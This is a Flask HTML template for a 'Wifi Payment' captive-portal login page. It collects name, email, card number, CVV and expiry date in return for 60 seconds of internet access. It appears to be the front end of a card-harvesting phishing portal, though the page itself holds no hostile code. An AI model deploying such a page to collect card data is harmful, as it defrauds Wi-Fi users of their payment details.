<!DOCTYPE html>
<html>
<head>
    <title>Wifi Payment</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="{{ url_for('static', filename='css/bootstrap.min.css') }}" rel="stylesheet">
    <style>
        @font-face {
            font-family: 'Raleway';
            src: url('{{ url_for('static', filename='fonts/Raleway-Regular.ttf') }}');
        }
        
        body {
            font-family: 'Raleway', sans-serif;
            background: linear-gradient(to right, #36d1dc, #5b86e5);
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            max-width: 500px;
            width: 90%; /* Responsive width */
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px 0 rgba(0,0,0,0.1);
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #5b86e5;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-control {
            height: 40px;
            border-radius: 5px;
            border: 1px solid #ddd;
            box-shadow: none;
            color: #333;
            background-color: #f9f9f9;
            transition: border-color 0.3s ease;
        }

        .form-control:focus {
            border-color: #5b86e5;
            box-shadow: 0 0 5px #5b86e5;
        }

        label {
            color: #666;
        }

        .btn {
            width: 100%;
            height: 40px;
            border-radius: 5px;
            border: none;
            font-weight: bold;
            cursor: pointer;
            background-color: #5b86e5;
            color: #fff;
            transition: background-color 0.3s ease;
        }

        .btn:hover {
            background-color: #4a74c9;
        }

        .alert {
            margin-top: 20px;
            transition: opacity 0.3s ease;
        }

        p.description {
            font-size: 1em;
            color: #888;
            margin-bottom: 20px;
            text-align: center;
        }

        /* Responsive adjustments */
        @media (max-width: 575.98px) {
            h2 {
                font-size: 1.5em;
            }
            
            p.description {
                font-size: 0.9em;
            }
            
            .container {
                width: 90%;
                padding: 10%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <p class="description">Log in to gain internet access for 60 seconds.</p>
        
        <!-- Display flash messages -->
        {% with messages = get_flashed_messages() %}
        {% if messages %}
        <div class="alert alert-danger">
            {{ messages[0] }}
        </div>
        {% endif %}
        {% endwith %}
        <!-- End flash messages -->

        <form action="/" method="post">
            <div class="form-group">
                <label for="name">Name</label>
                <input type="text" id="name" name="name" required class="form-control">
            </div>

            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required class="form-control">
            </div>

            <div class="form-group">
                <label for="card_number">Card Number</label>
                <input type="text" id="card_number" name="card_number" required class="form-control">
            </div>

            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" required class="form-control">
            </div>

            <div class="form-group">
                <label for="expiry_date">Expiry Date (MM/YY)</label>
                <input type="text" id="expiry_date" name="expiry_date" required class="form-control">
            </div>

            <button type="submit" class="btn btn-primary">Login</button>
        </form>
    </div>
</body>
</html>
